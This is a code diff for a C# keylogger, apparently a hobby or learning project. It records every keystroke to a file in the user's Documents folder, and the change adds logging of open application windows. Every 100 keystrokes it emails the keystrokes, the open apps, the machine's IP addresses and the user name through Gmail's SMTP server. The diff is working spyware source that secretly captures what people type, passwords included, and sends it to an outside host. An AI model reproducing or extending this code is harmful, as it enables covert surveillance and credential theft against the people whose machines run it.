@@ -15,22 +15,16 @@ namespace test1
         static long numberOfKeyStrokes = 0;
         static void Main(string[] args)
         {
-            //Process[] processes = Process.GetProcesses();
-            //foreach (Process p in processes)
-            //{
-            //    if (!String.IsNullOrEmpty(p.MainWindowTitle))
-            //    {
-            //        Console.WriteLine(FileVersionInfo.GetVersionInfo(p.MainModule.FileName).FileDescription);
-            //        //Console.WriteLine("Process: {0} ID: {1}", p.ProcessName, p.Id);
-            //    }
-            //}
             string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
             //if(!Directory.Exists(filepath))
             //Directory.CreateDirectory(filepath);
 
-            string path = (filepath + @"\keystrokes.txt");
-            if (!File.Exists(path))
-                using (StreamWriter sw = File.CreateText(path)) ;
+            string pathKeys = (filepath + @"\keystrokes.txt");
+            if (!File.Exists(pathKeys))
+                using (StreamWriter sw = File.CreateText(pathKeys)) ;
+            string pathProcesses = (filepath + @"\processes.txt");
+            if (!File.Exists(pathProcesses))
+                using (StreamWriter sw = File.CreateText(pathProcesses)) ;
 
             while (true)
             {
@@ -40,13 +34,25 @@ namespace test1
                     int keyState = GetAsyncKeyState(i);
                     if (keyState == 32769)
                     {
-                        using (StreamWriter sw = File.AppendText(path))
+                        using (StreamWriter sw = File.AppendText(pathKeys))
                         {
                             sw.Write((char)i);
                         }
                         numberOfKeyStrokes++;
                         if (numberOfKeyStrokes % 100 == 0)
                         {
+                            File.WriteAllText(pathProcesses, string.Empty);
+                            Process[] processes = Process.GetProcesses();
+                            foreach (Process p in processes)
+                            {
+                                if (!String.IsNullOrEmpty(p.MainWindowTitle))
+                                {
+                                    using (StreamWriter sw = File.AppendText(pathProcesses))
+                                    {
+                                        sw.WriteLine(FileVersionInfo.GetVersionInfo(p.MainModule.FileName).FileDescription);
+                                    }
+                                }
+                            }
                             SendNewMessage();
                         }
                     }
@@ -57,22 +63,23 @@ namespace test1
         static void SendNewMessage()
         {
             string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string filePath = folderName + @"\keystrokes.txt";
-            string logContents = File.ReadAllText(filePath);
+            string filePathKeys = folderName + @"\keystrokes.txt";
+            string filePathProcesses = folderName + @"\processes.txt";
+            string logContents = File.ReadAllText(filePathKeys);
+            string processes = File.ReadAllText(filePathProcesses);
 
             DateTime now = DateTime.Now;
             string subject = "Message from keylogger";
             string emailBody = "";
 
             var host = Dns.GetHostEntry(Dns.GetHostName());
-            //string name = host.HostName;
             foreach (var address in host.AddressList)
             {
                 emailBody += "\nAddress: " + address;
             }
             emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
-            //emailBody += "\n Host: " + name;
             emailBody += "\n Time: " + now.ToString();
+            emailBody += "\n Open apps: " + processes;
             emailBody += "\n Keys pressed: " + logContents;
 
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
